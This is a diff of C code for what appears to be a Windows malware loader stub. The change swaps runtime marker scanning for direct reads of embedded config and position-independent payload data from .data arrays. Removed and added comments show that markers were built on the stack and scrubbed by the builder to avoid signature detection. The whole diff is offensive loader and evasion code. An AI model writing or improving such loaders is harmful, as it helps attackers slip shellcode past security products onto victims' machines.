@@ -414,14 +414,10 @@ static inline void stub_execute_payload(void) {
 
     PBYTE base = (PBYTE)image_base;
 
-    /* Step 3: Find config marker (built on stack to avoid .rodata signature) */
-    BUILD_CONFIG_MARKER(cfg_marker);
-    PBYTE config_ptr = stub_find_marker_in_image(
-        base, image_size, cfg_marker, CONFIG_MARKER_LEN);
-    if (!config_ptr)
-        STUB_FAIL(103);
-
-    /* config_ptr now points to [max_size: u32 LE][config data...] */
+    /* Step 3: Read config directly from the stub_config_region array.
+       Each stub defines this as a static volatile array in .data. */
+    extern volatile BYTE stub_config_region[];
+    PBYTE config_ptr = (PBYTE)stub_config_region + CONFIG_MARKER_LEN; /* skip marker */
     DWORD config_max_size = *(DWORD *)config_ptr;
     PBYTE config_data = config_ptr + sizeof(DWORD);
 
@@ -433,14 +429,13 @@ static inline void stub_execute_payload(void) {
     if (config_len == 0 || config_len > config_max_size)
         STUB_FAIL(104);
 
-    /* Step 4: Find PIC blob marker (built on stack to avoid .rodata signature) */
-    BUILD_PIC_MARKER(pic_marker);
-    PBYTE pic_ptr = stub_find_marker_in_image(
-        base, image_size, pic_marker, PIC_MARKER_LEN);
-    if (!pic_ptr)
-        STUB_FAIL(105);
-
-    /* pic_ptr now points to [pic_size: u32 LE][entry_offset: u32 LE][pic data...] */
+    /* Step 4: Read PIC data directly from the stub_pic_region array.
+       Each stub defines this as a static volatile array in .data. We access
+       it via extern declaration — no marker scanning needed at runtime.
+       The builder already scrubbed the SPECPICBLOB text, but the size/offset/data
+       fields at known offsets within the array remain intact. */
+    extern volatile BYTE stub_pic_region[];
+    PBYTE pic_ptr = (PBYTE)stub_pic_region + PIC_MARKER_LEN; /* skip past marker bytes */
     DWORD pic_size = *(DWORD *)pic_ptr;
     DWORD pic_entry_off = *(DWORD *)(pic_ptr + sizeof(DWORD));
     PBYTE pic_data = pic_ptr + sizeof(DWORD) + sizeof(DWORD);
